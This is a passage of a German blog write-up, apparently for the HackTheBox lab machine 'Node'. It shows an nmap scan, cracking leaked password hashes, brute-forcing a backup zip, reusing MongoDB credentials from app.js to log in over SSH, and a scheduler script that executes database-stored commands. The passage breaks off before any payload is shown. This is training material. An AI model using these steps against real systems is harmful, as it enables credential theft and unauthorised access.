@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="m10x ">
+<meta name="description" content="Node ist eine der schwierigeren CTF Challenges von HackTheBox. Grundlegendes Wissen im Bereich Reverse Engineering und Datenbanken wird benötigt.
+Tipps Sieh dir den Seitenquelltext genau an. Wenn der Download abbricht, versuche einen anderen Browser, benutze Burp als Proxy oder kopiere den Seitenquelltext. ltrace (zum debuggen) und radare2 (zur Analyse des Assembly Codes) können dich an&amp;rsquo;s Ziel bringen. Um an /root/root.txt zu kommen gibt es 3 verschiedene Methoden. Video Anleitung Als erstes machen wir wie gewohnt einen Nmap-Scan." />
+<meta name="keywords" content="m10x, ctf, penetration test, hackthebox, ctf, german" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://www.m10x.de/posts/2018/03/hackthebox-node-writeup-tipps--anleitung/" />
+
+
+    <title>
+        
+            HackTheBox - Node WriteUp | Tipps &#43; Anleitung :: Maximilian Hildebrand  — German Penetration Testing Blog
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="https://www.m10x.de/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.m10x.de/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://www.m10x.de/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://www.m10x.de/favicon-16x16.png">
+    <link rel="manifest" href="https://www.m10x.de/site.webmanifest">
+    <link rel="mask-icon" href="https://www.m10x.de/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://www.m10x.de/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="HackTheBox - Node WriteUp | Tipps &#43; Anleitung">
+<meta itemprop="description" content="Node ist eine der schwierigeren CTF Challenges von HackTheBox. Grundlegendes Wissen im Bereich Reverse Engineering und Datenbanken wird benötigt.
+Tipps Sieh dir den Seitenquelltext genau an. Wenn der Download abbricht, versuche einen anderen Browser, benutze Burp als Proxy oder kopiere den Seitenquelltext. ltrace (zum debuggen) und radare2 (zur Analyse des Assembly Codes) können dich an&rsquo;s Ziel bringen. Um an /root/root.txt zu kommen gibt es 3 verschiedene Methoden. Video Anleitung Als erstes machen wir wie gewohnt einen Nmap-Scan."><meta itemprop="datePublished" content="2018-03-09T12:10:56+01:00" />
+<meta itemprop="dateModified" content="2018-03-09T12:10:56+01:00" />
+<meta itemprop="wordCount" content="3021"><meta itemprop="image" content="https://www.m10x.de"/>
+<meta itemprop="keywords" content="hackthebox,ctf,german," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://www.m10x.de"/>
+
+<meta name="twitter:title" content="HackTheBox - Node WriteUp | Tipps &#43; Anleitung"/>
+<meta name="twitter:description" content="Node ist eine der schwierigeren CTF Challenges von HackTheBox. Grundlegendes Wissen im Bereich Reverse Engineering und Datenbanken wird benötigt.
+Tipps Sieh dir den Seitenquelltext genau an. Wenn der Download abbricht, versuche einen anderen Browser, benutze Burp als Proxy oder kopiere den Seitenquelltext. ltrace (zum debuggen) und radare2 (zur Analyse des Assembly Codes) können dich an&rsquo;s Ziel bringen. Um an /root/root.txt zu kommen gibt es 3 verschiedene Methoden. Video Anleitung Als erstes machen wir wie gewohnt einen Nmap-Scan."/>
+
+
+
+    <meta property="og:title" content="HackTheBox - Node WriteUp | Tipps &#43; Anleitung" />
+<meta property="og:description" content="Node ist eine der schwierigeren CTF Challenges von HackTheBox. Grundlegendes Wissen im Bereich Reverse Engineering und Datenbanken wird benötigt.
+Tipps Sieh dir den Seitenquelltext genau an. Wenn der Download abbricht, versuche einen anderen Browser, benutze Burp als Proxy oder kopiere den Seitenquelltext. ltrace (zum debuggen) und radare2 (zur Analyse des Assembly Codes) können dich an&rsquo;s Ziel bringen. Um an /root/root.txt zu kommen gibt es 3 verschiedene Methoden. Video Anleitung Als erstes machen wir wie gewohnt einen Nmap-Scan." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.m10x.de/posts/2018/03/hackthebox-node-writeup-tipps--anleitung/" /><meta property="og:image" content="https://www.m10x.de"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2018-03-09T12:10:56+01:00" />
+<meta property="article:modified_time" content="2018-03-09T12:10:56+01:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2018-03-09 12:10:56 &#43;0100 &#43;0100" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://www.m10x.de/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                $ cd /home/m10x/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://www.m10x.de/about/">About</a></li><li><a href="https://www.m10x.de/summary/">Summary</a></li><li><a href="https://www.m10x.de/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        15 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://www.m10x.de/posts/2018/03/hackthebox-node-writeup-tipps--anleitung/">HackTheBox - Node WriteUp | Tipps + Anleitung</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <p><a href="https://www.hackthebox.eu/home/machines/profile/110">Node</a> ist eine der schwierigeren CTF Challenges von <a href="https://hackthebox.eu/">HackTheBox</a>. Grundlegendes Wissen im Bereich Reverse Engineering und Datenbanken wird benötigt.</p>
+<p><a href="https://imgur.com/LY2focA"><img src="https://imgur.com/LY2focA.jpg" alt="bewertung"></a></p>
+<h2 id="tipps"><strong>Tipps</strong></h2>
+<ul>
+<li>Sieh dir den Seitenquelltext genau an.</li>
+<li>Wenn der Download abbricht, versuche einen anderen Browser, benutze Burp als Proxy oder kopiere den Seitenquelltext.</li>
+<li><a href="https://en.wikipedia.org/wiki/Ltrace">ltrace</a> (zum debuggen) und <a href="https://en.wikipedia.org/wiki/Radare2">radare2</a> (zur Analyse des Assembly Codes) können dich an&rsquo;s Ziel bringen.</li>
+<li>Um an <strong>/root/root.txt</strong> zu kommen gibt es 3 verschiedene Methoden.</li>
+</ul>
+<h2 id="video"><strong>Video</strong></h2>
+<p><a href="http://www.youtube.com/watch?v=Kc-J_RgBauI"><img src="http://img.youtube.com/vi/Kc-J_RgBauI/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+<h2 id="anleitung"><strong>Anleitung</strong></h2>
+<p>Als erstes machen wir wie gewohnt einen Nmap-Scan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# nmap -A 10.10.10.58
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">2048</span> dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">256</span> 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ <span style="color:#ae81ff">256</span> d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 <span style="color:#f92672">(</span>EdDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3000/tcp open  http    Node.js Express framework
+</span></span><span style="display:flex;"><span>| hadoop-datanode-info:
+</span></span><span style="display:flex;"><span>|_ Logs: /login
+</span></span><span style="display:flex;"><span>|_hadoop-jobtracker-info:
+</span></span><span style="display:flex;"><span>| hadoop-tasktracker-info:
+</span></span><span style="display:flex;"><span>|_ Logs: /login
+</span></span><span style="display:flex;"><span>|_hbase-master-info:
+</span></span><span style="display:flex;"><span>|_http-title: MyPlace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>2 offene Ports wurden gefunden. SSH und auf <strong>Port 3000</strong> eine <strong>Node.js</strong> Webseite.</p>
+<p>Wenn wir uns den Seitenquelltext ansehen, können wir ganz unten Verweise auf Javascripts finden.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vendor/jquery/jquery.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vendor/bootstrap/js/bootstrap.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vendor/angular/angular.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vendor/angular/angular-route.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/js/app/app.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/js/app/controllers/home.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/js/app/controllers/login.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/js/app/controllers/admin.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/js/app/controllers/profile.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/js/misc/freelancer.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Sehen wir uns <strong>home.js</strong> mal an.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">controllers</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">angular</span>.<span style="color:#a6e22e">module</span>(<span style="color:#e6db74">&#39;controllers&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">controllers</span>.<span style="color:#a6e22e">controller</span>(<span style="color:#e6db74">&#39;HomeCtrl&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">$scope</span>, <span style="color:#a6e22e">$http</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">$http</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/api/users/latest&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">res</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$scope</span>.<span style="color:#a6e22e">users</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>In Zeile 4 wird auf <strong>/api/users/latest</strong> zugegriffen. Unter 10.10.10.58:3000/api/users/latest sehen wir 3 Benutzer mit ihrer jeweiligen <strong>_id</strong>, <strong>username</strong>, <strong>password</strong> und <strong>is_admin</strong>. Wobei das <strong>password</strong> jeweils ein <a href="https://www.security-insider.de/was-ist-ein-hash-a-635712/">Hash</a> zu seien scheint.</p>
+<p>Allerdings ist hier keiner der Benutzer ein Admin. Sehen wir uns darum mal <strong>/api/users/</strong> an.</p>
+<p><a href="https://imgur.com/CC4dErP"><img src="https://imgur.com/CC4dErP.jpg" alt="credentials"></a></p>
+<p>Hier ist ein Admin Account zu sehen und zwar <strong>myP14ceAdm1nAcc0uNT</strong>. Kopieren wir uns den Hash und benutzen einen Online Hash Cracker um zu sehen, ob wir das Password herausfinden können. Ich benutze dafür <a href="https://crackstation.net/">crackstation.net</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af <span style="color:#f92672">=</span> manchester
+</span></span></code></pre></div><p>Tatsächlich konnte es das Passwort herausfinden.</p>
+<p>Melden wir uns nun als <strong>myP14ceAdm1nAcc0uNT</strong> mit dem Passwort <strong>manchester</strong> an und laden uns das Backup herunter.</p>
+<p><a href="https://imgur.com/hz7pBLx"><img src="https://imgur.com/hz7pBLx.jpg" alt="backup"></a></p>
+<p>Falls der Download bei dir immer wieder abbrechen sollte gibt es 3 Möglichkeiten wie du dieses beheben kannst.</p>
+<ol>
+<li>Versuche einen anderen Browser</li>
+<li>Benutze Burp als Proxy</li>
+<li>Kopiere den Inhalt von <a href="http://view-source:http://10.10.10.58:3000/api/admin/backup">view-source:http://10.10.10.58:3000/api/admin/backup</a>s</li>
+</ol>
+<p>Wenn wir uns den Inhalt von <strong>myplace.backup</strong> ansehen, können wir sehen, dass es mit <a href="https://de.wikipedia.org/wiki/Base64">Base64</a> enkodiert wurde. Wir können <strong>base64 -d</strong> benutzen, um es zu dekodieren.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# cat myplace.backup | base64 -d &gt; myplace
+</span></span></code></pre></div><p>Sehen wir uns nun den Dateityp von der Datei <strong>myplace</strong> an, mit der Hilfe von <strong>file</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# file myplace
+</span></span><span style="display:flex;"><span>myplace: Zip archive data, at least v1.0 to extract
+</span></span></code></pre></div><p>Es handelt sich um eine Zip Datei.</p>
+<p>Nennen wir myplace zu myplace.zip um.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# mv myplace myplace.zip
+</span></span></code></pre></div><p>Allerdings wird ein Passwort benötigt um die Zip Datei zu öffnen.</p>
+<p>Das Password der Zip Datei können wir bruteforcen. Ich benutze dafür <a href="http://oldhome.schmorp.de/marc/fcrackzip.html">fcrackzip</a> und die <strong>rockyou</strong> Wortliste, welche sich bei Kali Linux standardmäßig unter <strong>/usr/share/wordlists/rockyou.txt</strong> befindet.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip
+</span></span><span style="display:flex;"><span>possible pw found: magicword <span style="color:#f92672">()</span>
+</span></span></code></pre></div><p>Das Passwort ist also <strong>magicword</strong>.</p>
+<p>Jetzt können mir <strong>myplace.zip</strong> entpacken.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# unzip myplace.zip
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>root@kali:~# cd var/www/myplace
+</span></span><span style="display:flex;"><span>root@kali:~# ls
+</span></span><span style="display:flex;"><span>app.html app.js mark node_modules package.json package-lock.json static
+</span></span></code></pre></div><p>Sehen wir uns <strong>app.js</strong> genauer an.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">root</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">kali</span><span style="color:#f92672">:~</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">cat</span> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">js</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">session</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express-session&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">MongoClient</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;mongodb&#39;</span>).<span style="color:#a6e22e">MongoClient</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ObjectID</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;mongodb&#39;</span>).<span style="color:#a6e22e">ObjectID</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;path&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">spawn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">spawn</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">backup_key</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;</span>;
+</span></span><span style="display:flex;"><span>[...]
+</span></span></code></pre></div><p>Es wird anscheinend <a href="https://www.mongodb.com/de">MongoDB</a> und der Nutzername <strong>mark</strong> mit dem Passwort <strong>5AYRft73VtFpc84k</strong> um sich bei <a href="https://www.mongodb.com/de">MongoDB</a> anzumelden.</p>
+<p>Probieren wir diese Anmeldedaten bei <strong>SSH</strong> aus.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# ssh mark@10.10.10.58
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>mark@node:~$
+</span></span></code></pre></div><p>Es hat tatsächlich funktioniert.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mark@node:~$ ls /home
+</span></span><span style="display:flex;"><span>frank mark tom
+</span></span></code></pre></div><p>Unter <strong>/home</strong> sind noch 2 andere Benutzer zu finden. <strong>frank</strong> und <strong>tom</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mark@node:~$ ps aux | grep tom
+</span></span><span style="display:flex;"><span>tom <span style="color:#ae81ff">1224</span> 0.0 5.7 <span style="color:#ae81ff">1008560</span> <span style="color:#ae81ff">43964</span> ? Ssl 05:06 0:06 /usr/bin/node /var/scheduler/app.js
+</span></span><span style="display:flex;"><span>tom <span style="color:#ae81ff">1231</span> 3.2 8.1 <span style="color:#ae81ff">1034224</span> <span style="color:#ae81ff">61784</span> ? Ssl 05:06 12:28 /usr/bin/node /var/www/myplace/app.js
+</span></span></code></pre></div><p>2 Prozesse gehören <strong>tom</strong>. Sehen wir uns <strong>/var/scheduler/app.js</strong> an.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mark@node:~$ cat /var/scheduler/app.js
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>const exec <span style="color:#f92672">=</span> require<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;child_process&#39;</span><span style="color:#f92672">)</span>.exec;
+</span></span><span style="display:flex;"><span>const MongoClient <span style="color:#f92672">=</span> require<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;mongodb&#39;</span><span style="color:#f92672">)</span>.MongoClient;
+</span></span><span style="display:flex;"><span>const ObjectID <span style="color:#f92672">=</span> require<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;mongodb&#39;</span><span style="color:#f92672">)</span>.ObjectID;
+</span></span><span style="display:flex;"><span>const url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MongoClient.connect<span style="color:#f92672">(</span>url, <span style="color:#66d9ef">function</span><span style="color:#f92672">(</span>error, db<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>error <span style="color:#f92672">||</span> !db<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    console.log<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;[!] Failed to connect to mongodb&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  setInterval<span style="color:#f92672">(</span><span style="color:#66d9ef">function</span> <span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    db.collection<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;tasks&#39;</span><span style="color:#f92672">)</span>.find<span style="color:#f92672">()</span>.toArray<span style="color:#f92672">(</span><span style="color:#66d9ef">function</span> <span style="color:#f92672">(</span>error, docs<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!error <span style="color:#f92672">&amp;&amp;</span> docs<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        docs.forEach<span style="color:#f92672">(</span><span style="color:#66d9ef">function</span> <span style="color:#f92672">(</span>doc<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>doc<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            console.log<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Executing task &#39;</span> + doc._id + <span style="color:#e6db74">&#39;...&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>            exec<span style="color:#f92672">(</span>doc.cmd<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>            db.collection<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;tasks&#39;</span><span style="color:#f92672">)</span>.deleteOne<span style="color:#f92672">({</span> _id: new ObjectID<span style="color:#f92672">(</span>doc._id<span style="color:#f92672">)</span> <span style="color:#f92672">})</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">}</span>
